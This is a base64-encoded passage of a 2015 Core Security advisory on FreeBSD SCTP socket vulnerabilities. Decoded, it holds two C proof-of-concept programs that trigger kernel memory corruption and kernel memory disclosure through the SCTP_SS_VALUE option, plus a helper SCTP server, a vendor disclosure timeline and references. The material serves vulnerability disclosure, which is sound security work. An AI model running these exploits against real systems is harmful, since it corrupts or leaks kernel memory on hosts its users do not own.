0cF9hc3NvY192YWx1ZSBhc3NvY192YWx1ZTsNCiAgICBzb2NrbGVuX3Qgb3B0X2xlbjsNCg0KICAgIHByaW50ZigiKiogRnJlZUJTRCBTQ1RQIFNvY2tldCBTQ1RQX1NTX1ZBTFVFIE1lbW9yeSBDb3JydXB0aW9uIFZ1bG5lcmFiaWxpdHkgUG9DICoqXG4iKTsNCg0KICAgIGlmICgoZmQgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fU0NUUCkpIDwgMCkgew0KICAgICAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgICAgICBnb3RvIG91dDsNCiAgICB9DQogICAgbWVtc2V0KCZpbml0LCAwLCBzaXplb2YoaW5pdCkpOw0KICAgIGluaXQuc2luaXRfbnVtX29zdHJlYW1zID0gMjA0ODsNCiAgICBpZiAoc2V0c29ja29wdChmZCwgSVBQUk9UT19TQ1RQLCBTQ1RQX0lOSVRNU0csICZpbml0LCAoc29ja2xlbl90KXNpemVvZihzdHJ1Y3Qgc2N0cF9pbml0bXNnKSkgPCAwKSB7DQogICAgICAgIHBlcnJvcigiU0NUUF9JTklUTVNHIik7DQogICAgICAgIGdvdG8gb3V0Ow0KICAgIH0NCg0KICAgIG1lbXNldCgmYWRkciwgMCwgc2l6ZW9mKGFkZHIpKTsNCiAgICAjaWZkZWYgSEFWRV9TSU5fTEVODQogICAgYWRkci5zaW5fbGVuID0gc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbik7DQogICAgI2VuZGlmDQogICAgYWRkci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiAgICBhZGRyLnNpbl9wb3J0ID0gaHRvbnMoUE9SVCk7DQogICAgYWRkci5zaW5fYWRkci5zX2FkZHIgPSBpbmV0X2FkZHIoQUREUik7DQogICAgaWYgKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikmYWRkciwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpIDwgMCkgew0KICAgICAgICBwZXJyb3IoImNvbm5lY3QiKTsNCiAgICAgICAgZ290byBvdXQ7DQogICAgfQ0KDQogICAgLyogU2V0IHVwIHRoZSBzdGNiLT5hc29jLnNzX2Z1bmN0aW9ucyBzdHJ1Y3Qgd2l0aCB0aGUgZnVuY3Rpb24gcG9pbnRlcnMgYmVsb25naW5nIHRvIHRoZSBTQ1RQX1NTX1BSSU9SSVRZIHNvY2tldCBvcHRpb24gKi8NCiAgICBtZW1zZXQoJmFzc29jX3ZhbHVlLCAwLCBzaXplb2YoYXNzb2NfdmFsdWUpKTsNCiAgICBhc3NvY192YWx1ZS5hc3NvY192YWx1ZSA9IFNDVFBfU1NfUFJJT1JJVFk7DQogICAgYXNzb2NfdmFsdWUuYXNzb2NfaWQgPSBTQ1RQX0NVUlJFTlRfQVNTT0M7DQogICAgaWYgKHNldHNvY2tvcHQoZmQsIElQUFJPVE9fU0NUUCwgU0NUUF9QTFVHR0FCTEVfU1MsICZhc3NvY192YWx1ZSwgKHNvY2tsZW5fdClzaXplb2Yoc3RydWN0IHNjdHBfYXNzb2NfdmFsdWUpKSA8IDApew0KICAgICAgICBwZXJyb3IoInNldHRpbmcgdXAgZnVuY3Rpb24gcG9pbnRlcnMiKTsNCiAgICAgICAgZ290byBvdXQ7DQogICAgfQ0KDQogICAgbWVtc2V0KCZzdHJlYW1fdmFsdWUsIDAsIHNpemVvZihzdHJlYW1fdmFsdWUpKTsNCiAgICBzdHJlYW1fdmFsdWUuYXNzb2NfaWQgPSBTQ1RQX0NVUlJFTlRfQVNTT0M7DQogICAgLyogDQogICAgICogc3RyZWFtX2lkIHdpbGwgYmUgdXNlZCBhcyBhbiBpbmRleCBpbnRvIHRoZSBzdGNiLT5hc29jLnN0cm1vdXQgYXJyYXkgd2l0aG91dCBwZXJmb3JtaW5nIGJvdW5kcyBjaGVja2luZy4NCiAgICAgKiBzdHJlYW1fdmFsdWUgd2lsbCBiZSB3cml0dGVuIHRvIHRoZSBjYWxjdWxhdGVkIGFkZHJlc3MuDQogICAgICovDQogICAgc3RyZWFtX3ZhbHVlLnN0cmVhbV9pZCA9IDB4RkZGRjsNCiAgICBzdHJlYW1fdmFsdWUuc3RyZWFtX3ZhbHVlID0gMHg0MTQyOw0KICAgIC8qIFRyaWdnZXJpbmcgdGhlIHZ1bG5lcmFiaWxpdHkuLi4gKi8NCiAgICBpZiAoc2V0c29ja29wdChmZCwgSVBQUk9UT19TQ1RQLCBTQ1RQX1NTX1ZBTFVFLCAmc3RyZWFtX3ZhbHVlLCAoc29ja2xlbl90KXNpemVvZihzdHJ1Y3Qgc2N0cF9zdHJlYW1fdmFsdWUpKSA8IDApew0KICAgICAgICBwZXJyb3IoInRyaWdnZXJpbmcgdGhlIHZ1bG5lcmFiaWxpdHkiKTsNCiAgICAgICAgZ290byBvdXQ7DQogICAgfQ0KDQpvdXQ6DQogICAgaWYgKGNsb3NlKGZkKSA8IDApIHsNCiAgICAgICAgcGVycm9yKCJjbG9zZSIpOw0KICAgIH0NCiAgICByZXR1cm4oMCk7DQp9DQoNCiAgICAgDQotLS0tLS8NCg0KVGhlIGZvbGxvd2luZyBjb2RlIGlzIGEgUHJvb2Ygb2YgQ29uY2VwdCBmb3IgdGhlIHRoaXJkIHZ1bG5lcmFiaWxpdHk6DQoNCg0KLy0tLS0tDQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxuZXRpbmV0L3NjdHAuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L3NjdHBfdWlvLmg+DQojaW5jbHVkZSA8YXJwYS9pbmV0Lmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0KI2RlZmluZSBQT1JUIDQ0NDQNCiNkZWZpbmUgQUREUiAiMTI3LjAuMC4xIg0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSB7DQogICAgaW50IGZkOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiBhZGRyOw0KICAgIHN0cnVjdCBzY3RwX2luaXRtc2cgaW5pdDsNCiAgICBzdHJ1Y3Qgc2N0cF9zdHJlYW1fdmFsdWUgc3RyZWFtX3ZhbHVlOw0KICAgIHN0cnVjdCBzY3RwX2Fzc29jX3ZhbHVlIGFzc29jX3ZhbHVlOw0KICAgIHNvY2tsZW5fdCBvcHRfbGVuOw0KDQogICAgcHJpbnRmKCIqKiBGcmVlQlNEIFNDVFAgU29ja2V0IFNDVFBfU1NfVkFMVUUgS2VybmVsIE1lbW9yeSBEaXNjbG9zdXJlIFZ1bG5lcmFiaWxpdHkgKipcbiIpOw0KDQogICAgaWYgKChmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19TQ1RQKSkgPCAwKSB7DQogICAgICAgIHBlcnJvcigic29ja2V0Iik7DQogICAgICAgIGdvdG8gb3V0Ow0KICAgIH0NCiAgICBtZW1zZXQoJmluaXQsIDAsIHNpemVvZihpbml0KSk7DQogICAgaW5pdC5zaW5pdF9udW1fb3N0cmVhbXMgPSAyMDQ4Ow0KICAgIGlmIChzZXRzb2Nrb3B0KGZkLCBJUFBST1RPX1NDVFAsIFNDVFBfSU5JVE1TRywgJmluaXQsIChzb2NrbGVuX3Qpc2l6ZW9mKHN0cnVjdCBzY3RwX2luaXRtc2cpKSA8IDApIHsNCiAgICAgICAgcGVycm9yKCJTQ1RQX0lOSVRNU0ciKTsNCiAgICAgICAgZ290byBvdXQ7DQogICAgfQ0KDQogICAgbWVtc2V0KCZhZGRyLCAwLCBzaXplb2YoYWRkcikpOw0KICAgICNpZmRlZiBIQVZFX1NJTl9MRU4NCiAgICBhZGRyLnNpbl9sZW4gPSBzaXplb2Yoc3RydWN0IHNvY2thZGRyX2luKTsNCiAgICAjZW5kaWYNCiAgICBhZGRyLnNpbl9mYW1pbHkgPSBBRl9JTkVUOw0KICAgIGFkZHIuc2luX3BvcnQgPSBodG9ucyhQT1JUKTsNCiAgICBhZGRyLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihBRERSKTsNCiAgICBpZiAoY29ubmVjdChmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZhZGRyLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyX2luKSkgPCAwKSB7DQogICAgICAgIHBlcnJvcigiY29ubmVjdCIpOw0KICAgICAgICBnb3RvIG91dDsNCiAgICB9DQoNCiAgICAvKiBTZXQgdXAgdGhlIHN0Y2ItPmFzb2Muc3NfZnVuY3Rpb25zIHN0cnVjdCB3aXRoIHRoZSBmdW5jdGlvbiBwb2ludGVycyBiZWxvbmdpbmcgdG8gdGhlIFNDVFBfU1NfUFJJT1JJVFkgc29ja2V0IG9wdGlvbiAqLw0KICAgIG1lbXNldCgmYXNzb2NfdmFsdWUsIDAsIHNpemVvZihhc3NvY192YWx1ZSkpOw0KICAgIGFzc29jX3ZhbHVlLmFzc29jX3ZhbHVlID0gU0NUUF9TU19QUklPUklUWTsNCiAgICBhc3NvY192YWx1ZS5hc3NvY19pZCA9IFNDVFBfQ1VSUkVOVF9BU1NPQzsNCiAgICBpZiAoc2V0c29ja29wdChmZCwgSVBQUk9UT19TQ1RQLCBTQ1RQX1BMVUdHQUJMRV9TUywgJmFzc29jX3ZhbHVlLCAoc29ja2xlbl90KXNpemVvZihzdHJ1Y3Qgc2N0cF9hc3NvY192YWx1ZSkpIDwgMCl7DQogICAgICAgIHBlcnJvcigic2V0dGluZyB1cCBmdW5jdGlvbiBwb2ludGVycyIpOw0KICAgICAgICBnb3RvIG91dDsNCiAgICB9DQoNCiAgICBtZW1zZXQoJnN0cmVhbV92YWx1ZSwgMCwgc2l6ZW9mKHN0cmVhbV92YWx1ZSkpOw0KICAgIG9wdF9sZW4gPSBzaXplb2Yoc3RyZWFtX3ZhbHVlKTsNCiAgICBzdHJlYW1fdmFsdWUuYXNzb2NfaWQgPSBTQ1RQX0NVUlJFTlRfQVNTT0M7DQogICAgLyogc3RyZWFtX2lkIHdpbGwgYmUgdXNlZCBhcyBhbiBpbmRleCBpbnRvIHRoZSBzdGNiLT5hc29jLnN0cm1vdXQgYXJyYXkgd2l0aG91dCBwZXJmb3JtaW5nIGJvdW5kcyBjaGVja2luZy4gKi8NCiAgICBzdHJlYW1fdmFsdWUuc3RyZWFtX2lkID0gMHg0MDA7DQogICAgLyogVHJpZ2dlcmluZyB0aGUgdnVsbmVyYWJpbGl0eS4uLiAqLw0KICAgIGlmIChnZXRzb2Nrb3B0KGZkLCBJUFBST1RPX1NDVFAsIFNDVFBfU1NfVkFMVUUsICZzdHJlYW1fdmFsdWUsICZvcHRfbGVuKSA8IDApew0KICAgICAgICBwZXJyb3IoInRyaWdnZXJpbmcgdGhlIHZ1bG5lcmFiaWxpdHkiKTsNCiAgICAgICAgZ290byBvdXQ7DQogICAgfQ0KDQogICAgcHJpbnRmKCJbKl0gVmFsdWUgbGVha2VkIGZyb20ga2VybmVsOiAweCUwNFhcbiIsIHN0cmVhbV92YWx1ZS5zdHJlYW1fdmFsdWUpOw0KDQpvdXQ6DQogICAgaWYgKGNsb3NlKGZkKSA8IDApIHsNCiAgICAgICAgcGVycm9yKCJjbG9zZSIpOw0KICAgIH0NCiAgICByZXR1cm4oMCk7DQp9DQoNCiAgICAgDQotLS0tLS8NCg0KTm90ZSB0aGF0IGJvdGggdGhlIHNlY29uZCBhbmQgdGhpcmQgUG9DcyB0cnkgdG8gY29ubmVjdCB0byBhIGR1bW15IFNDVFAgc2VydmVyIGxpc3RlbmluZyBvbiBsb2NhbGhvc3Qgb24gcG9ydCA0NDQ0LCBzaW5jZSB0aGUgU0NUUCBzb2NrZXQgbmVlZHMgdG8gYmUgaW4gYSAnY29ubmVjdGVkJyBzdGF0ZSBpbiBvcmRlciB0byB0cmlnZ2VyIHRoZSB2dWxuZXJhYmlsaXRpZXMuIFRoZSBmb2xsb3dpbmcgY29kZSwgYmFzZWQgb24gdGhlIGV4YW1wbGUgY29kZSBwdWJsaXNoZWQgaGVyZVs1XSwgY2FuIGJlIHVzZWQgdG8gcnVuIGEgc2ltcGxlIFNDVFAgc2VydmVyIGxpc3RlbmluZyBvbiBwb3J0IDQ0NDQ6DQoNCg0KLy0tLS0tDQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxuZXRpbmV0L3NjdHAuaD4NCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2RlZmluZSBCVUZGRVJfU0laRSAoMTw8MTYpDQojZGVmaW5lIFBPUlQgNDQ0NA0KI2RlZmluZSBBRERSICIxMjcuMC4wLjEiDQoNCiAgICBpbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSB7DQogICAgICAgIGludCBmZCwgbiwgZmxhZ3M7DQogICAgICAgIHN0cnVjdCBzb2NrYWRkcl9pbiBhZGRyOw0KICAgICAgICBzb2NrbGVuX3QgZnJvbV9sZW47DQogICAgICAgIHN0cnVjdCBzY3RwX3NuZHJjdmluZm8gc2luZm87DQogICAgICAgIGNoYXIgYnVmZmVyW0JVRkZFUl9TSVpFXTsNCiAgICAgICAgc3RydWN0IHNjdHBfZXZlbnRfc3Vic2NyaWJlIGV2ZW50Ow0KICAgIA0KICAgICAgICBpZiAoKGZkID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU0VRUEFDS0VULCBJUFBST1RPX1NDVFApKSA8IDApIHsNCiAgICAgICAgICAgIHBlcnJvcigic29ja2V0Iik7DQogICAgICAgICAgICBnb3RvIG91dDsNCiAgICAgICAgfQ0KDQogICAgICAgIG1lbXNldCgmZXZlbnQsIDEsIHNpemVvZihzdHJ1Y3Qgc2N0cF9ldmVudF9zdWJzY3JpYmUpKTsNCiAgICAgICAgaWYgKHNldHNvY2tvcHQoZmQsIElQUFJPVE9fU0NUUCwgU0NUUF9FVkVOVFMsICZldmVudCwgc2l6ZW9mKHN0cnVjdCBzY3RwX2V2ZW50X3N1YnNjcmliZSkpIDwgMCkgew0KICAgICAgICAgICAgcGVycm9yKCJzZXRzb2Nrb3B0Iik7DQogICAgICAgICAgICBnb3RvIG91dDsNCiAgICAgICAgfQ0KDQogICAgICAgIG1lbXNldCgmYWRkciwgMCwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpOw0KICAgICAgICAjaWZkZWYgSEFWRV9TSU5fTEVODQogICAgICAgIGFkZHIuc2luX2xlbiA9IHNpemVvZihzdHJ1Y3Qgc29ja2FkZHJfaW4pOw0KICAgICAgICAjZW5kaWYNCiAgICAgICAgYWRkci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiAgICAgICAgYWRkci5zaW5fcG9ydCA9IGh0b25zKFBPUlQpOw0KICAgICAgICBhZGRyLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihBRERSKTsNCiAgICAgICAgaWYgKGJpbmQoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikmYWRkciwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpIDwgMCkgew0KICAgICAgICAgICAgcGVycm9yKCJiaW5kIik7DQogICAgICAgICAgICBnb3RvIG91dDsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChsaXN0ZW4oZmQsIDEpIDwgMCkgew0KICAgICAgICAgICAgcGVycm9yKCJsaXN0ZW4iKTsNCiAgICAgICAgICAgIGdvdG8gb3V0Ow0KICAgICAgICB9DQoNCiAgICAgICAgd2hpbGUgKDEpIHsNCiAgICAgICAgICAgIGZsYWdzID0gMDsNCiAgICAgICAgICAgIG1lbXNldCgmYWRkciwgMCwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpOw0KICAgICAgICAgICAgZnJvbV9sZW4gPSAoc29ja2xlbl90KXNpemVvZihzdHJ1Y3Qgc29ja2FkZHJfaW4pOw0KICAgICAgICAgICAgbWVtc2V0KCZzaW5mbywgMCwgc2l6ZW9mKHN0cnVjdCBzY3RwX3NuZHJjdmluZm8pKTsNCiAgICAgICAgICAgIG4gPSBzY3RwX3JlY3Ztc2coZmQsICh2b2lkICopYnVmZmVyLCBCVUZGRVJfU0laRSwgKHN0cnVjdCBzb2NrYWRkciAqKSZhZGRyLCAmZnJvbV9sZW4sICZzaW5mbywgJmZsYWdzKTsNCiAgICAgICAgICAgIGlmIChmbGFncyAmIE1TR19OT1RJRklDQVRJT04pIHsNCiAgICAgICAgICAgICAgICBwcmludGYoIk5vdGlmaWNhdGlvbiByZWNlaXZlZC5cbiIpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHByaW50ZigiTXNnIG9mIGxlbmd0aCAlZCByZWNlaXZlZCBmcm9tICVzOiV1IG9uIHN0cmVhbSAlZCwgUFBJRCAlZC5cbiIsIG4sIGluZXRfbnRvYShhZGRyLnNpbl9hZGRyKSwgbnRvaHMoYWRkci5zaW5fcG9ydCksc2luZm8uc2luZm9fc3RyZWFtLCBudG9obChzaW5mby5zaW5mb19wcGlkKSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0Kb3V0Og0KICAgICAgICBpZiAoY2xvc2UoZmQpIDwgMCkgew0KICAgICAgICAgICAgcGVycm9yKCJjbG9zZSIpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAoMCk7DQogICAgfQ0KICAgICANCi0tLS0tLw0KDQoNCjkuICpSZXBvcnQgVGltZWxpbmUqDQoNCi4gMjAxNS0wMS0xNToNCg0KSW5pdGlhbCBub3RpZmljYXRpb24gc2VudCB0byBGcmVlQlNELiBQdWJsaWNhdGlvbiBkYXRlIHNldCB0byBGZWIgMTYsIDIwMTUuDQogICAgICAgIA0KDQouIDIwMTUtMDEtMTU6DQoNCkZyZWVCU0QgY29uZmlybXMgcmVjZXB0aW9uIG9mIHRoZSByZXBvcnQgYW5kIHJlcXVlc3RzIHRoZSBkcmFmdCB2ZXJzaW9uIG9mIHRoZSBhZHZpc29yeS4gVGhleSBjbGFyaWZ5IHRoYXQgdGhleSB1c3VhbGx5IGFpbSBmb3IgVHVlc2RheSByZWxlYXNlcyBkZXBlbmRpbmcgb24gdGhlIHNldmVyaXR5IG9mIHRoZSBwcm9ibGVtLg0KICAgICAgICANCg0KLiAyMDE1LTAxLTE1Og0KQ29yZSBTZWN1cml0eSBzZW5kcyBhIGRyYWZ0IHZlcnNpb24gb2YgdGhlIGFkdmlzb3J5IHRvIHRoZSB2ZW5kb3IgYW5kIHJlcXVlc3RzIHRvIGJlIGluZm9ybWVkIG9uY2UgdGhleSBmaW5pc2ggcmV2aWV3aW5nIHRoZSB2dWxuZXJhYmlsaXRpZXMuDQogICAgICAgIA0KDQouIDIwMTUtMDEtMjY6DQpDb3JlIFNlY3VyaXR5IHJlcXVlc3RzIGEgc3RhdHVzIHJlcG9ydCByZWdhcmRpbmcgdGhlaXIgcmV2aWV3IG9mIHRoZSB2dWxuZXJhYmlsaXRpZXMgYW5kIHRoZSBlc3RpbWF0ZWQgcHVibGljYXRpb24gZGF0ZS4NCiAgICAgICAgDQoNCi4gMjAxNS0wMS0yNjoNCg0KRnJlZUJTRCBjb25maXJtcyB0aGUgYnVncywgYnV0IGluZm9ybXMgdXMgdGhhdCB0aGV5J2xsIG9ubHkgcHVibGlzaCBhIHNlY3VyaXR5IGFkdmlzb3J5IGZvciB0aGUgU0NUUCBTb2NrZXQgU0NUUF9TU19WQUxVRSBNZW1vcnkgQ29ycnVwdGlvbiBhbmQgS2VybmVsIE1lbW9yeSBEaXNjbG9zdXJlIHZ1bG5lcmFiaWxpdGllcy4gRm9yIHRoZSAidnQgRHJpdmVyIFZUX1dBSVRBQ1RJVkUgU2lnbiBDb252ZXJzaW9uIFZ1bG5lcmFiaWxpdHkiIHRoZXkgd2lsbCBjb21taXQgYSBub3JtYWwgY2hhbmdlIGFuZCB0aGVuIHJlbGVhc2UgYW4gIkVycmF0YSBOb3RpY2UiIGluZm9ybWluZyB0aGUgZml4LiBUaGV5IHNldCB0aGUgcHVibGljYXRpb24gZGF0ZSBmb3IgMjd0aCBKYW51YXJ5LCAyMDE1LiANCiAgICAgICAgDQoNCi4gMjAxNS0wMS0yNjoNCkNvcmUgU2VjdXJpdHkgaW5mb3JtcyB0aGF0IHVuZGVyc3RhbmRzIHRoZWlyIHBvc2l0aW9uIHJlZ2FyZGluZyB0aGUgdnQgRHJpdmVyIFZUX1dBSVRBQ1RJVkUgU2lnbiBDb252ZXJzaW9uIGlzc3VlLCBidXQgd2Ugd2lsbCBuZXZlcnRoZWxlc3MgcHVibGlzaCB0aGV3IGJ1ZyBpbiB0aGUgYWR2aXNvcnkgYmVjYXVzZSB3ZSBjb25zaWRlciBpdCBhIHZ1bG5lcmFiaWxpdHkuIFdlIGFjY2VwdGVkIHRoZWlyIG9mZmVyIG9mIHNoYXJpbmcgQ1ZFIElEcy4NCiAgICAgICAgDQoNCi4gMjAxNS0wMS0yNjoNCg0KRnJlZUJTRCBjb25maXJtcyB0aGV5IGhhdmUgYXZhaWxhYmxlIENWRSBJRHMgYW5kIGFzayBpZiB3ZSB3YW50IHRvIHVzZSBJRHMgZnJvbSAyMDE0IG9yIDIwMTUuDQogICAgICAgIA0KDQouIDIwMTUtMDEtMjc6DQoNCkZyZWVCU0QgaW5mb3JtcyB1cyB0aGF0IGFmdGVyIGdvaW5nIHRocm91Z2ggdGhlaXIgbWFpbCBhcmNoaXZlIHRoZXkgZm91bmQgb3V0IHRoYXQgdGhlIHNhbWUgaXNzdWUgd2FzIHJlcG9ydGVkIGJ5IEdvb2dsZSBhbmQgdGhhdCB0aGV5IG1pc3NlZCBpdC4gVGhleSBpbmZvcm0gdXMgdGhhdCB0aGV5IHdpbGwgdXNlIG9ubHkgb25lIENWRSBJRCBmb3IgdGhlIHR3byBTQ1RQIGlzc3VlcyBiZWNhdXNlIHRoZXkgc3RhdGUgdGhleSBhcmUgb2YgdGhlIHNhbWUgbmF0dXJlLg0KICAgICAgICANCg0KLiAyMDE1LTAxLTI3Og0KDQpDb3JlIFNlY3VyaXR5IGluZm9ybXMgdGhhdCB3aWxsIGFzc2lnbiBhIHRoZSBDVkUgSUQgQ1ZFLTIwMTQtMDk5OCB0byB0aGUgdnQoNCkgdnVsbmVyYWJpbGl0eSBhbmQgd2UgcmVxdWVzdGVkIHRoZSBkYXRlIGFuZCB0aW1lIHRoZXkgcGxhbiB0byByZWxlYXNlIHRoZSBmaXggYW5kIGFkdmlzb3J5Lg0KICAgICAgICANCg0KLiAyMDE1LTAxLTI3Og0KDQpGcmVlQlNEIGluZm9ybXMgdGhleSB3aWxsIHB1Ymxpc2ggdGhlIGZpeCBhbmQgYWR2aXNvcnkgdG9kYXkuDQogICAgICAgIA0KDQouIDIwMTUtMDEtMjc6DQoNCkFkdmlzb3J5IENPUkUtMjAxNS0wMDAzIHB1Ymxpc2hlZC4NCiAgICAgICAgDQoNCg0KMTAuICpSZWZlcmVuY2VzKg0KDQpbMV0gaHR0cHM6Ly93d3cuZnJlZWJzZC5vcmcvcmVsZWFzZXMvMTAuMVIvcmVsbm90ZXMuaHRtbCNuZXcNClsyXSBodHRwczovL3d3dy5mcmVlYnNkLm9yZy9jZ2kvbWFuLmNnaT9xdWVyeT12dCZzZWt0aW9uPTQNClszXSBodHRwczovL3dpa2kuZnJlZWJzZC5vcmcvTmV3Y29ucw0KWzRdIGh0dHBzOi8vd3d3LmZyZWVic2Qub3JnL2NnaS9tYW4uY2dpP3F1ZXJ5PXNjdHAmc2VrdGlvbj00DQpbNV0gaHR0cDovL3d3dy5ic2RjYW4ub3JnLzIwMDgvc2NoZWR1bGUvYXR0YWNobWVudHMvNDRfYnNkY2FuX3NjdHAucGRmDQpbNl0gaHR0cHM6Ly9zZWN1cml0eS5GcmVlQlNELm9yZy9hZHZpc29yaWVzL0ZyZWVCU0QtU0EtMTU6MDIua21lbS5hc2MNCg0KDQoxMS4gKkFib3V0IENvcmVMYWJzKg0KDQogICAgICBDb3JlTGFicywgdGhlIHJlc2VhcmNoIGNlbnRlciBvZiBDb3JlIFNlY3VyaXR5LCBpcyBjaGFyZ2VkIHdpdGggYW50aWNpcGF0aW5nDQogICAgICB0aGUgZnV0dXJlIG5lZWRzIGFuZCByZXF1aXJlbWVudHMgZm9yIGluZm9ybWF0aW9uIHNlY3VyaXR5IHRlY2hub2xvZ2llcy4NCiAgICAgIFdlIGNvbmR1Y3Qgb3VyIHJlc2VhcmNoIGluIHNldmVyYWwgaW1wb3J0YW50IGFyZWFzIG9mIGNvbXB1dGVyIHNlY3VyaXR5DQogICAgICBpbmNsdWRpbmcgc3lzdGVtIHZ1bG5lcmFiaWxpdGllcywgY3liZXIgYXR0YWNrIHBsYW5uaW5nIGFuZCBzaW11bGF0aW9uLA0KICAgICAgc291cmNlIGNvZGUgYXVkaXRpbmcsIGFuZCBjcnlwdG9ncmFwaHkuIE91ciByZXN1bHRzIGluY2x1ZGUgcHJvYmxlbQ0KICAgICAgZm9ybWFsaXphdGlvbiwgaWRlbnRpZmljYXRpb24gb2YgdnVsbmVyYWJpbGl0aWVzLCBub3ZlbCBzb2x1dGlvbnMgYW5kDQogICAgICBwcm90b3R5cGVzIGZvciBuZXcgdGVjaG5vbG9naWVzLiBDb3JlTGFicyByZWd1bGFybHkgcHVibGlzaGVzIHNlY3VyaXR5DQogICAgICBhZHZpc29yaWVzLCB0ZWNobmljYWwgcGFwZXJzLCBwcm9qZWN0IGluZm9ybWF0aW9uIGFuZCBzaGFyZWQgc29mdHdhcmUNCiAgICAgIHRvb2xzIGZvciBwdWJsaWMgdXNlIGF0Og0KICAgICAgaHR0cDovL2NvcmVsYWJzLmNvcmVzZWN1cml0eS5jb20uDQogICAgDQoNCg0KMTIuICpBYm91dCBDb3JlIFNlY3VyaXR5IFRlY2hub2xvZ2llcyoNCg0KDQogICAgICBDb3JlIFNlY3VyaXR5IFRlY2hub2xvZ2llcyBlbmFibGVzIG9yZ2FuaXphdGlvbnMgdG8gZ2V0IGFoZWFkIG9mIHRocmVhdHMNCiAgICAgIHdpdGggc2VjdXJpdHkgdGVzdCBhbmQgbWVhc3VyZW1lbnQgc29sdXRpb25zIHRoYXQgY29udGludW91c2x5IGlkZW50aWZ5DQogICAgICBhbmQgZGVtb25zdHJhdGUgcmVhbC13b3JsZCBleHBvc3VyZXMgdG8gdGhlaXIgbW9zdCBjcml0aWNhbCBhc3NldHMuIE91cg0KICAgICAgY3VzdG9tZXJzIGNhbiBnYWluIHJlYWwgdmlzaWJpbGl0eSBpbnRvIHRoZWlyIHNlY3VyaXR5IHN0YW5kaW5nLCByZWFsDQogICAgICB2YWxpZGF0aW9uIG9mIHRoZWlyIHNlY3VyaXR5IGNvbnRyb2xzLCBhbmQgcmVhbCBtZXRyaWNzIHRvIG1vcmUNCiAgICAgIGVmZmVjdGl2ZWx5IHNlY3VyZSB0aGVpciBvcmdhbml6YXRpb25zLg0KICAgIA0KDQoNCiAgICAgIENvcmUgU2VjdXJpdHkncyBzb2Z0d2FyZSBzb2x1dGlvbnMgYnVpbGQgb24gb3ZlciBhIGRlY2FkZSBvZiB0cnVzdGVkDQogICAgICByZXNlYXJjaCBhbmQgbGVhZGluZy1lZGdlIHRocmVhdCBleHBlcnRpc2UgZnJvbSB0aGUgY29tcGFueSdzIFNlY3VyaXR5DQogICAgICBDb25zdWx0aW5nIFNlcnZpY2VzLCBDb3JlTGFicyBhbmQgRW5naW5lZXJpbmcgZ3JvdXBzLiBDb3JlIFNlY3VyaXR5DQogICAgICBUZWNobm9sb2dpZXMgY2FuIGJlIHJlYWNoZWQgYXQgKzEgKDYxNykgMzk5LTY5ODAgb3Igb24gdGhlIFdlYiBhdDoNCiAgICAgIGh0dHA6Ly93d3cuY29yZXNlY3VyaXR5LmNvbS4NCiAgICANCg0KDQoxMy4gKkRpc2NsYWltZXIqDQoNCg0KICAgICAgVGhlIGNvbnRlbnRzIG9mIHRoaXMgYWR2aXNvcnkgYXJlIGNvcHlyaWdodA0KICAgICAgKGMpIDIwMTUgQ29yZSBTZWN1cml0eSBhbmQgKGMpIDIwMTUgQ29yZUxhYnMsDQogICAgICBhbmQgYXJlIGxpY2Vuc2VkIHVuZGVyIGEgQ3JlYXRpdmUgQ29tbW9ucw0KICAgICAgQXR0cmlidXRpb24gTm9uLUNvbW1lcmNpYWwgU2hhcmUtQWxpa2UgMy4wIChVbml0ZWQgU3RhdGVzKSBMaWNlbnNlOg0KICAgICAgaHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbGljZW5zZXMvYnktbmMtc2EvMy4wL3VzLw0KDQoNCjE0LiAqUEdQL0dQRyBLZXlzKg0KDQoNCiAgICAgIFRoaXMgYWR2aXNvcnkgaGFzIGJlZW4gc2lnbmVkIHdpdGggdGhlIEdQRyBrZXkgb2YgQ29yZSBTZWN1cml0eSBhZHZpc29yaWVzDQogICAgICB0ZWFtLCB3aGljaCBpcyBhdmFpbGFibGUgZm9yIGRvd25sb2FkIGF0DQogICAgICBodHRwOi8vd3d3LmNvcmVzZWN1cml0eS5jb20vZmlsZXMvYXR0YWNobWVudHMvY29yZV9